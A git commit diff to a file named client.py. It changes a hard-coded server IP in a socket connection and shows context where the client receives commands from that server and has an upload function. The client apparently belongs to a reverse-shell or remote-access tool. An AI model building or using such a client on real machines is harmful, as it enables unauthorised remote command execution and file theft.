7aee67f1554a5a96d14c64eee3e468a84c6bbd7a
maorsabag <maorsa198@gmail.com>
2021-09-26 01:23:38 +0300

    Edited IP

--- client.py
+++ client.py
@@ -29,7 +29,7 @@ def upload(s, path):
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.1.13", 1234)) # Server IP and Listening Port
+    s.connect(("0.0.0.0", 1234)) # Server IP and Listening Port
 
     while True:
         command = s.recv(BUFFER_SIZE)
